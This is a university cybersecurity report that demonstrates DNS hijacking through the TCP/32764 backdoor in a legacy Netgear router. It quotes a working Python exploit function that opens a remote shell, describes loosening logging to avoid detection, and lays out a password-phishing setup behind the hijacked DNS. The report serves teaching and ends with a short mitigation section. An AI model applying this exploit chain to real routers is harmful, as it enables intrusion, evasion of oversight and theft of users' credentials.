
# Exploiting the TCP/32764 Vulnerability in Legacy Netgear Wireless Routers for DNS Hijacking

Submitted for the course of Cybersecurity (436MI) 2024 at UniTS


<div style="display: flex; justify-content: space-between;">
    <div style="text-align: right;"> Nicolò Ermanno Millo </div>
    <div style="text-align: left;"> Trieste, 28th May 2024 </div>
</div>


## Introduction

In this report, I will demostrate how to accomplish a DNS hijacking router attack[^10] against endpoints connected to vulnerable Netgear DG834Gv3 wireless router.


## Threat Model

To align the report with a real scenario, the following threat model is considered throughout the entire document:

Given an operational Netgear DG834Gv3 wireless router, it is assumed that the attacker has the capability to connect to the same LAN managed by the router.

## System Information Discovery

Generally, even before connecting to an access point, it is possible to visually inspect the physical device and recognize its model. If not, it is still possible to gather the same information using specialized software tools, one among all, Nmap.

&nbsp;

![The Markdown Mark](images/nmap.PNG)  
_Figure 1: Nmap command execution for detecting OS of the gateway, supposed wireless router[^8]._

&nbsp;

This very approach is not encouraged because it is noisy in terms of network traffic, making it more detectable. In fact, Nmap, to complete the command, sends more than 1000 TCP packets to the router. This is a considerable amount of traffic, especially considering that the gathered information may not be complete. 

While the OS and manufacturer can be identified, the model remains unknown, which is the most crucial piece of information.

Another way to obtain the desired information is to observe and interact with the services provided by the device. 
Executed Nmap command supported this method, having detected an HTTP service on port 80, a likely admin web panel. Anyway the same service could be found also by guesses.

&nbsp;

![The Markdown Mark](images/adminpanel.PNG)  
_Figure 2: Unauthorized access to HTTP service, beside the HTML code of the webpage._

&nbsp;

Within the HTML of the page, there is a meta tag "description" that discloses what is being searched for. The device is identified as a wireless router (+ switch + firewall + modem) of the Netgear DG384* series. Although the precise model remains unknown, it is absolutely not necessary for our purpose.

This last approach appears to be less detectable, as network traffic is reduced and more conventional. However, it's worth think over that after a failed authentication attempt on the admin panel, a notification could be send to the administrator. 

At the current phase of the attack, this uncertainty cannot be addressed.

## Unveiling Backdoor

When it was determined that we are connected to a Netgear DG834G* device, it might be planned to exploit an hidden backdoor.

This device, like many other systems based on Sercomm modem, exposes a backdoor that can be exploited to gain administrative rights within router OS without valid credentials [^2]. Interestingly, it is not a mistake in itself, but rather an arbitrary hidden functionality (CWE-912)[^1], probably part of a legacy Sercomm updating tool.

These claims are supported by the fact that after the vulnerability disclosure, the subsequent system image patches did not close the backdoor but instead merely hid it[^5]. Even today, it can be reactivated easily by sending a proper Ethernet packet[^3].

None comments on these facts was released by Sercomm and Netgear[^2].

### Exploit and Payload

Interaction with the backdoor is based on a TCP-based undocumented protocol. Eloi Vanderbeken at Synactiv successfully reverse-engineered it using IDA Pro[^6]. Once understood the functioning of the protocol and it was discovered that it may be exploited in order to open a root associated remote shell, a Python Proof-of-Concept (PoC) and a Metasploit module were developed. 

There are significant differences between them.

- The PoC was specifically developed for the Linksys WAG200G wireless router, however, it effectively works for the Netgear DG834Gv3 as well. Nevertheless, there are no assurances regarding compatibility with other devices.
Additionally, the script can be utilized to directly access to various Sercomm protocol methods, including a non-reversed root-associated remote shell.

- On the other hand, the Metasploit module is capable of operating with a wide range of routers and offers many different payloads, including a Linux reverse shell[^9]. A notable difference is that neither of them opens a root shell. Instead, the associated account is "nobody". This class of account is generally used as a low privilege debug account to prevent severe compromises of remote systems[^4]. Nevertheless, it seems to have read access rights almost everywhere.

Despite the differences, both are based on the same protocol and TCP packets exchange is equiparable.

&nbsp;

![The Markdown Mark](images/cap_poc.PNG)  
_Figure 3: Wireshark capture of PoC-based remote shell initialization._

&nbsp;

To better understand the reason for this payload and the functioning of the protocol in general, the PoC and documentation[^6] come to aid.

Wrapping up, the protocol works over TCP;  it requires a hardcoded header dictated by the router architecture, specifically endianess; the very payload is enclosed in plaintext and without any authentication or complications.

&nbsp;

```python

def send_message(s, endianness, message, payload=''):
    """
    Send a message and return associated response via open TCP connection to backdoor of TCP/32764 vulnerable target

    Parameters:
    s          (socket) : Open TCP connection to target (server) on port 32764
    endianness (char)   : Endianness of the target system ('<' for little endian, '>' for big endian)
    message    (int)    : Index of backdoor functionality to be executed
    payload    (string) : Optional textual parameters for the chosen functionality

    Returns:
    ret_val   (int)    : Numeric return value from the backdoor functionality
    ret_str   (string) : Textual return string from the backdoor functionality
    """

    header = struct.pack(endianness + 'III', 0x53634D4D, message, len(payload)+1)
    s.send(header+payload+"\x00")
    
    r = s.recv(0xC)
    
    # Ensure that the response is complete
    while len(r) < 0xC:
        tmp = s.recv(0xC - len(r))
        assert len(tmp) != 0
        r += tmp
    
    # Unpack the received response
    sig, ret_val, ret_len = struct.unpack(endianness + 'III', r)
    
    # Check if the signature matches the expected value
    assert(sig == 0x53634D4D)

    if ret_val != 0:
        return ret_val, "ERROR"
    
    # If no error, compose return string from the router
    ret_str = ""
    while len(ret_str) < ret_len:
        tmp = s.recv(ret_len - len(ret_str))
        assert len(tmp) != 0
        ret_str += tmp

    return ret_val, ret_str

# ... if/elif discriminates backdoor functionalities

elif args.shell : # Poc arg : --shell
    print(send_message(s, endianness, 7, 'echo "welcome, here is a root shell, have fun"')[1])
    while 1 :
        print(send_message(s, endianness, 7, sys.stdin.readline().strip('\n'))[1])

#...
```
&nbsp;

Code released with Beerware licence [^7]. Unique modifications concerns the added comments.



## Operating System Exploration

Once a shell is opened, the next logical step is to examine the functionalities and configurations of the system.

Before taking any action, it is critical to verify the logging policy of the device. If properly configured, the mere access to the backdoor, but also the earlier reconnaissance actions performed, may generate logs and potentially would then be sent to an administrator.

&nbsp;

![The Markdown Mark](images/log.PNG)  
_Figure 4: Router configuration files showing log policy._

&nbsp;

Fortunately, none of the actions are registered in the logs, even though the log configuration file indicates that the strictest log policy is enabled. It is also important to note that successful accesses to the admin web panel are logged.

After having reviewed the logs, it is critical to understand which user is associated with the Linux shell and which are its access rights. Finally, it should be understood the structure of the operating system and so gather any sensitive information. 

These assessments allows the attacker to grasp the magnitude of their privilege within the system and devise a feasible attack accordingly.

&nbsp;

![The Markdown Mark](images/busy.PNG)  
_Figure 5: Programs made available by Busybox._

&nbsp;

Not surprisingly, the operating system has a considerably compact memory footprint. This aspect practically reflects on the number of programs installed on the machine. The majority of programs are made available by the Busybox software suite.

Unfortunately, the available programs are not numerous and are also quite outdated. Additionally, installing new ones is challenging. This aspect is crucial because it dictates the manner in which the router can be compromised.

&nbsp;

![The Markdown Mark](images/conf.PNG)  
_Figure 6: Sensitive configuration files._

&nbsp;

Achieving admin credentials to the web panel conceptually does not grant any more privilege than being root in the shell. However, working on HTTP is potentially less detectable because it is less anomalous.

In any case, as mentioned before, admin authentication on the web panel is logged, so the first step should be to modify syslog.conf via PoC root shell, in order to temporarily loosen the log policy.

Summing up all the information gathered, in the next section I will propose a set of feasible configuration modifications to compromise other devices attached to the router.

## Modifying system configuration

Given the limited functionalities of the device, an easily feasible modification is changing the DNS configuration to route DNS requests to an attacker-controlled DNS server. This can be configured to respond to certain DNS requests with the IP addresses of malicious web servers, potentially facilitating a MITM threat model.


&nbsp;

![The Markdown Mark](images/web.PNG)  
_Figure 7: DNS configuration page of admin web panel._

&nbsp;

With the support of the compromised router, a malicious DNS server can be set up on an attacker machine using the `bind9` service. This let associate to domain _postesicure.com_ a local malicious website on  `apache2`. Finally, the website should be configure to seems trustable enough in order to intercept sensitive information of victim user, i.e. where only password is needed to authentication.

&nbsp;

![The Markdown Mark](images/dns.PNG)  
_Figure 8: Malicious webpage loaded next to DNS traffic to malicious DNS server._

&nbsp;

To make the attack more sophisticated, the same web server can act as an evil proxy. This allows the attacker to manipulate HTTP requests and responses to external trusted websites. Un/fortunately, setting up such a framework is extremely easy with free tools like `evilginx2`, which can be configured to target major websites swiftly and with minimal technical expertise. To avoid interaction with real web applications, no similar tools are employed.

Main problem about DNS hijacking managed in that way followed so far is surely detactability. The attacker machine and its services should be keeped up for a long time within a network that potentially have implemented some network monitoring solution.

To deal with this scenario, it is a good practise restrict the compromising infrastructure to the bare router. For instance, the wireless router made available `iptables` program. This let to devise proper network address translation, in order to redirect chosen traffic to external malicious server. However, it's important to note that the version of `iptables` on the router is considerably old, which means many advanced functionalities may not be available.

## Patch System Image

Reconstructing and upgrade the firmware of the router to add functionalities is indeed a straightforward way to achieve even more advanced offensive techniques.

However, it's important to note that this approach may increase the likelihood of detection, especially if significant changes are made. Nonetheless, it's important to acknowledge that a reboot of the device is inevitable after firmware modification.

In addition, modifying a genuine firmware carries high risk, even when using specialized tools such as `binwalk` or `firmware-modkit`. If the procedure fails, the consequences can range from the update being rejected i.e. due to image hash issues, to rendering the device inoperable, requiring physical intervention for recovery.

## Mitigation

Exploiting TCP/32764 vulnerability is surely easy and highly effective, as we have seen. However also the main adviced mitigation has the same properties. To preventing access to the backdoor, nothing more than firewall port 32764 is required[^1].  

&nbsp;
&nbsp;
&nbsp;


## Bibliography

[^1]: “NETGEAR ROUTER DG/DGN/DM/JNR/WPNT PORT TCP/32764 BACKDOOR”, VulDB, https://vuldb.com/?id.11715

[^2]: S. Gallagher, “Easter egg: DSL router patch merely hides backdoor instead of closing it”, Ars Technica, https://arstechnica.com/information-technology/2014/04/easter-egg-dsl-router-patch-merely-hides-backdoor-instead-of-closing-it/

[^3]: J. Ullrich , “Port 32764 router backdoor is back (or was it ever gone?) ,” SANS Technology Institute - Internet Storm Center, https://isc.sans.edu/diary/Port+32764+Router+Backdoor+is+Back+or+was+it+ever+gone/18009 

[^4]:  O. Kirch, Why NFS sucks”, Suse/Novell inc., Proceedings of Ottawa Linux Symposium 2006, https://www.kernel.org/doc/ols/2006/ols2006v2-pages-59-72.pdf

[^5]: E. Vanderbeken, "How Sercomm saved my Easter! Another backdoor in my router: when Christmas is NOT enough!", Synactiv, https://www.synacktiv.com/ressources/TCP32764_backdoor_again.pdf

[^6]: E. Vanderbeken, "TCP/32764 backdoor Or how linksys saved christmas!", Github, https://github.com/elvanderb/TCP-32764/blob/master/backdoor_description_for_those_who_don-t_like_pptx.pdf

[^7]: https://github.com/elvanderb/TCP-32764/blob/master/LICENSE

[^8]: G. Lyon, "Nmap Network Scanning", https://nmap.org/book/osdetect-usage.html#osdetect-ex-scanme1

[^9]: "SerComm Device Remote Code Execution - Metasploit", Infosec Matter,  https://www.infosecmatter.com/metasploit-module-library/?mm=payload/linux/mipsbe/shell_reverse_tcp

[^10]: "What DNS Hijacking Is and How to Combat It", EC-Council Cybersecurity Exchange, https://www.eccouncil.org/cybersecurity-exchange/network-security/what-is-dns-hijacking-how-to-prevent-dns-attacks/
